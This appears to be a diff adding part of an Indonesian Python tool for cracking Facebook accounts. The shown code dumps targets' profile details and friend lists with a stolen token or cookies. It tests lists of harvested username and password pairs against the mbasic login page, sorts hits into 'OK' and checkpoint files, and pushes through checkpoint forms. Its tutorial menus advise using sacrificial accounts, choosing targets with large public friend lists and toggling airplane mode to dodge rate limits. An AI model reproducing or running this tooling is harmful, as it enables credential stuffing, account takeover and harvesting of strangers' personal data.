+    except (KeyError,IOError):lc = ("-")
+    try:ht = zy["hometown"]["name"]
+    except (KeyError,IOError):ht = ("-")
+    try:ab = zy["about"]
+    except (KeyError,IOError):ab = ("-")
+    try:lo = zy["locale"]
+    except (KeyError,IOError):lo = ("-")
+    jalan('%s╠══[%s•%s] %sNama : %s'%(O,P,O,P,nm))
+    jalan('%s╠══[%s•%s] %sNama Depan : %s'%(O,P,O,P,nd))
+    jalan('%s╠══[%s•%s] %sNama Tengah : %s'%(O,P,O,P,nt))
+    jalan('%s╠══[%s•%s] %sNama Belakang : %s'%(O,P,O,P,nb))
+    jalan('%s╠══[%s•%s] %sTTL : %s'%(O,P,O,P,ut))
+    jalan('%s╠══[%s•%s] %sGender : %s'%(O,P,O,P,gd))
+    jalan('%s╠══[%s•%s] %sEmail : %s'%(O,P,O,P,em))
+    jalan('%s╠══[%s•%s] %sLink : %s'%(O,P,O,P,lk))
+    jalan('%s╠══[%s•%s] %sUsername : %s'%(O,P,O,P,us))
+    jalan('%s╠══[%s•%s] %sAgama : %s'%(O,P,O,P,rg))
+    jalan('%s╠══[%s•%s] %sStatus Hubungan : %s'%(O,P,O,P,rl))
+    jalan('%s╠══[%s•%s] %sHubungan Dengan : %s'%(O,P,O,P,rls))
+    jalan('%s╠══[%s•%s] %sTempat Tinggal : %s'%(O,P,O,P,lc))
+    jalan('%s╠══[%s•%s] %sTempat Asal : %s'%(O,P,O,P,ht))
+    jalan('%s╠══[%s•%s] %sTentang : %s'%(O,P,O,P,ab))
+    jalan('%s╠══[%s•%s] %sLocale : %s'%(O,P,O,P,lo))
+    print('%s║'%(O))
+    input('%s╚══[ %sReturn %s]%s'%(O,P,O,P))
+    menu()
+def teman_target():
+    it = input('%s╠══[%s•%s] %sID Target : '%(O,P,O,P))
+    try:
+        token = open('token.txt','r').read()
+        mm = requests.get('https://graph.facebook.com/%s?access_token=%s'%(it,token))
+        nn = json.loads(mm.text)
+        print ('%s╠══[%s•%s] %sName : %s'%(O,P,O,P,nn['name']))
+    except (KeyError,IOError):
+        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
+        menu_log()
+    tt=[]
+    te=[]
+    lim = input('%s╠══[%s•%s] %sLimit Dump : '%(O,P,O,P))
+    print('%s║%s'%(O,P))
+    ada = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(it,lim,token))
+    idi = json.loads(ada.text)
+    for x in idi['data']:
+        tt.append(x['id'])
+    for id in tt:
+        try:
+            ada2 = requests.get('https://graph.facebook.com/%s/friends?access_token=%s'%(id,token))
+            idi2 = json.loads(ada2.text)
+            try:
+                for b in idi2['data']:
+                    te.append(b['id'])
+            except KeyError:
+                print('╠══[!] Private')
+            print('╠══[•]',id,'•',len(te))
+            te.clear()
+        except KeyError:
+            print('╠══[!] Spam Accounts')
+    print('║')
+    input('╚══[ Return ]')
+    menu()
+def hasil():
+    clear()
+    banner()
+    jalan('%s╔══[ %sCrack Results %s]'%(O,P,O))
+    print('%s║'%(O))
+    print('%s╠══[%s1%s] %sCheck Result OK'%(O,P,O,P))
+    print('%s╠══[%s2%s] %sCheck result CP'%(O,P,O,P))
+    ch = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+    if ch in ['']:
+        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+        menu()
+    elif ch in ['1','01','001','a']:
+        try:
+            okl = os.listdir("OK")
+            print('%s║'%(O))
+            print('%s╠══[%s Crack Results Stored in File OK%s]'%(O,P,O))
+            print('%s║'%(O))
+            for file in okl:
+                print('%s╠══[%s•%s] %s%s'%(O,P,O,P,file))
+            print('%s║'%(O))
+            files = input('%s╚══[%s•%s] %sEnter File Name : '%(O,P,O,P))
+            print('')
+            if files == "":
+                jalan('%s═══[%s!%s] %sCorrect Content'%(M,P,M,P))
+                hasil()
+            os.system('cat OK/%s'%(files))
+            ppp = open("OK/%s"%(files)).read().splitlines()
+            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
+            print('\n%s╔══[%s•%s] %sTotal Crack Result Date %s is %s Account'%(O,P,O,P,del1,len(ppp)))
+        except (KeyError,IOError):
+            print('%s╠══[%s No Results Found %s]'%(M,P,M))
+    elif ch in ['2','02','002','b']:
+        try:
+            cpl = os.listdir("CP")
+            print('%s║'%(O))
+            print('%s╠══[%s Crack Results Stored in CP Files %s]'%(O,P,O))
+            print('%s║'%(O))
+            for file in cpl:
+                print('%s╠══[%s•%s] %s%s'%(O,P,O,P,file))
+            print('%s║'%(O))
+            files = input('%s╚══[%s•%s] %sEnter File Name : '%(O,P,O,P))
+            print('')
+            if files == "":
+                jalan('%s═══[%s!%s] %sCorrect Content'%(M,P,M,P))
+                hasil()
+            os.system('cat CP/%s'%(files))
+            ppp = open("CP/%s"%(files)).read().splitlines()
+            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
+            print('\n%s╔══[%s•%s] %sTotal Crack Result Date %s is %s Account'%(O,P,O,P,del1,len(ppp)))
+        except (KeyError,IOError):
+            print('%s╠══[%s No Results Found %s]'%(M,P,M))
+    else:
+        jalan('%s╚══[%s!%s] %sCorrect Content'%(M,P,M,P))
+        menu()
+    print('%s║'%(O))
+    input('%s╚══[ %sReturn %s]%s'%(O,P,O,P))
+    menu()
+def log_hasil(user, pasw):
+    ua = "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
+    ses = requests.Session()
+    ses.headers.update({
+    "Host": "mbasic.facebook.com",
+    "cache-control": "max-age=0",
+    "upgrade-insecure-requests": "1",
+    "origin": host,
+    "content-type": "application/x-www-form-urlencoded",
+    "user-agent": ua,
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+    "x-requested-with": "mark.via.gp",
+    "sec-fetch-site": "same-origin",
+    "sec-fetch-mode": "navigate",
+    "sec-fetch-user": "?1",
+    "sec-fetch-dest": "document",
+    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
+    "accept-encoding": "gzip, deflate",
+    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+    })
+    data = {}
+    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
+    fm = ged.find("form",{"method":"post"})
+    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
+    for i in fm.find_all("input"):
+        if i.get("name") in list:
+            data.update({i.get("name"):i.get("value")})
+        else:
+            continue
+    data.update({"email":user,"pass":pasw})
+    try:
+        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
+    except requests.exceptions.TooManyRedirects:
+        print("%s[%s!%s] %sSpam Accounts"%(M,P,M,P))
+    if "c_user" in ses.cookies:
+        print("%s[%s•%s] %sAccount OK No Checkpointt"%(H,P,H,P))
+    elif "checkpoint" in ses.cookies:
+        form = run.find("form")
+        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
+        jzst = form.find("input",{"name":"jazoest"})["value"]
+        nh   = form.find("input",{"name":"nh"})["value"]
+        dataD = {
+            "fb_dtsg": dtsg,
+            "fb_dtsg": dtsg,
+            "jazoest": jzst,
+            "jazoest": jzst,
+            "checkpoint_data":"",
+            "submit[Continue]":"Lanjutkan",
+            "nh": nh
+        }
+        xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
+        ngew = [yy.text for yy in xnxx.find_all("option")]
+        if(str(len(ngew))=="0"):
+            print("%s[%s•%s] %sOne Tap Account"%(H,P,H,P))
+        else:
+            print("%s[%s•%s] %sThereis %s Option "%(O,P,O,P,str(len(ngew))))
+        for opt in range(len(ngew)):
+            print(" "*3, str(opt+1)+". "+ngew[opt])
+    elif "login_error" in str(run):
+        oh = run.find("div",{"id":"login_error"}).find("div").text
+        print("%s[%s!%s] %s%s"%(M,P,M,P,oh))
+    else:
+        print("%s[%s!%s] %sPassword Has Changed"%(M,P,M,P))
+def cek_hasil():
+    jalan('%s╠══[ %sCheck Crack Result Account Options %s]'%(O,P,O))
+    print('%s║'%(O))
+    print('%s╠══[%s•%s] %sExample File : CP/%s.txt'%(O,P,O,P,tanggal))
+    files = input('%s╠══[%s•%s] %sFile : '%(O,P,O,P))
+    try:
+        buka_baju = open(files,"r").readlines()
+    except FileNotFoundError:
+        print("%s╚══[%s!%s] %sFile Not Existing"%(M,P,M,P))
+        time.sleep(2); cek_hasil()
+    print("%s╚══[%s•%s] %sNumber of Accounts : %s"%(O,P,O,P,str(len(buka_baju))))
+    print("")
+    for memek in buka_baju:
+        kontol = memek.replace("\n","")
+        titid  = kontol.split("•")
+        print("%s[%s•%s] %sCheck Login : %s"%(O,P,O,P,kontol))
+        try:
+            log_hasil(titid[0], titid[1])
+        except requests.exceptions.ConnectionError:
+            continue
+        print("")
+    print("")
+    print('%s╔══[%s•%s] %s Checking Process Complete'%(O,P,O,P))
+    print('%s║'%(O))
+    input('%s╚══[ %sReturn %s]%s'%(O,P,O,P))
+    menu()
+def var_menu():
+    print('%s╔══[ %sSelect Method Login %s]'%(O,P,O))
+    print('%s║'%(O))
+    print('%s╠══[%s1%s] %sLogin with Token'%(O,P,O,P))
+    print('%s╠══[%s2%s] %sLogin with Cookies'%(O,P,O,P))
+    print('%s╠══[%s3%s] %sScript Usage Tutorial'%(O,P,O,P))
+    print('%s╠══[%s4%s] %sInfo Author & Team Project'%(O,P,O,P))
+    print('%s╠══[%s0%s] %sGo Back'%(O,P,O,P))
+def var_tutor():
+    mlaku('%s╔══[%s Tips & Tutorial %s]'%(O,P,O))
+    print('%s║'%(O))
+    print('%s╠══[%s1%s] %sHow to Take Token'%(O,P,O,P))
+    print('%s╠══[%s2%s] %sHow to Take Cookies'%(O,P,O,P))
+    print('%s╠══[%s3%s] %sHow to Get Target'%(O,P,O,P))
+    print('%s╠══[%s4%s] %sWays During the Crack Process'%(O,P,O,P))
+def tutor_target():
+    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
+    mlaku('%s║ %s1 %s║ %sPrepare a Sacrificial Account In Chrome For Cracking Process %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s2 %s║ %sChange the Victim Account Password First          %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s3 %s║ %sFind Random Account Targets, Friends List Must Be Public   %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s4 %s║ %sFriends (FL) Free, Can be 1K, 2K, 3K, ,4K, Or 5K      %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s5 %s║ %sMore Friends, More Possible Results  %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s6 %s║ %sTap Target Profile/Cover Photo                      %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s7 %s║ %ssee URL/Link Above, There is \ id = 10001xx\ %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s8 %s║ %sWell, thats a target ID ready to crack   %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s9 %s║ %sOpen Termux/Linux then proceed to the Crack Process %s║'%(O,P,O,P,O))
+    mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
+    print('%s║'%(O))
+def tutor_crack():
+    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
+    mlaku('%s║ %s1 %s║ %sMethod Api : Fast But Easy Process Spam            %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s2 %s║ %sMethod Mbasic : The process is quite fast, rarely spammed  %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s3 %s║ %sMethod Mobile : Slow Process, Probably OK  %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s4 %s║ %sCrack Using Data Quota (Not Support Wifi)  %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s5 %s║ %sIf Results Do Not Appear While The Crack Is Running       %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s6 %s║ %sTurn On Airplane Mode Only 5 Seconds                   %s║'%(O,P,O,P,O))
+    mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
+    print('%s║'%(O))
+def var_author():
+    mlaku('%s╔══[ %sAuthor & Team Project %s]'%(O,P,O))
+    mlaku('%s║'%(O))
+    mlaku('%s╠══[%s•%s] %sAuthor :'%(O,P,O,P))
+    mlaku('%s║     • %sPANTEK'%(O,P))
+    mlaku('%s║     • %sSPANTEK'%(O,P))
+    mlaku('%s║'%(O))
+    mlaku('%s╠══[%s•%s] %sTeam Project %sXNSCODE%s :'%(O,P,O,P,O,P))
+    mlaku('%s║     • %sPANTEK'%(O,P))
+    mlaku('%s║     • %sPANTEK'%(O,P))
+    mlaku('%s║     • %sPANTEK'%(O,P))
+    mlaku('%s║     • %sPANTEK '%(O,P))
+    mlaku('%s║     • %sPANTEK'%(O,P))
+    mlaku('%s║     • %sPANTEK'%(O,P))
+    mlaku('%s║     • %sPANTEK'%(O,P))
+    mlaku('%s║     • %sPANTEK'%(O,P))
+    mlaku('%s║     • %sPANTEK'%(O,P))
+    mlaku('%s║     • %sPANTEK'%(O,P))
+    mlaku('%s║     • %sPANTEK'%(O,P))
+    mlaku('%s║     • %sPANTEK'%(O,P))
+    mlaku('%s║'%(O))
+def var_ugen():
+    print("%s╠══[%s1%s] %sGet User Agent"%(O,P,O,P))
+    print("%s╠══[%s2%s] %sChange User Agent%s(%sManual%s)"%(O,P,O,P,O,P,O))
+    print("%s╠══[%s3%s] %sChange User Agent %s(%sAdjust HP%s)"%(O,P,O,P,O,P,O))
+    print("%s╠══[%s4%s] %sDelete User Agent"%(O,P,O,P))
+    print("%s╠══[%s5%s] %sCheck User Agent"%(O,P,O,P))
+    print("%s╠══[%s0%s] %sReturn"%(O,P,O,P))
+def start_method():
+    print('%s║'%(O))
+    print('%s╠══[%s1%s] %sMethod Api'%(O,P,O,P))
+    print('%s╠══[%s2%s] %sMethod Mbasic'%(O,P,O,P))
+    print('%s╠══[%s3%s] %sMethod Free FB'%(O,P,O,P))
+def start_methodezz():
+    print('%s║'%(O))
+    print('%s╠══[%s1%s] %sFast Crack %s[%s6 pass%s]'%(O,P,O,P,O,P,O))
+    print('%s╠══[%s2%s] %sSlow Crack %s[%s9 pass%s]'%(O,P,O,P,O,P,O))
+    print('%s╠══[%s3%s] %sVery Slow Crack %s[%s12 pass%s]'%(O,P,O,P,O,P,O))
+    print('%s╠══[%s4%s] %sCrack Password Combine'%(O,P,O,P))
+def started():
+    print('%s║'%(O))
+    print('%s╠══[%s•%s] %sCrack Is Running...'%(O,P,O,P))
+    print('%s╠══[%s•%s] %sAccount [OK] Saved To OK/%s.txt'%(O,P,O,P,tanggal))
+    print('%s╠══[%s•%s] %sAccount [CP] Saved To CP/%s.txt'%(O,P,O,P,tanggal))
+    print('%s╚══[%s•%s] %sActivate Airplane Mode [5 Seconds Only] Every 5 Minutes\n'%(O,P,O,P))
+def folder():
+    try:os.mkdir("CP")
+    except:pass
+    try:os.mkdir("OK")
+    except:pass
+if __name__=='__main__':
+  os.system('git pull')
+  folder()
+  menu()
+# Mau Ngapain Cuk?
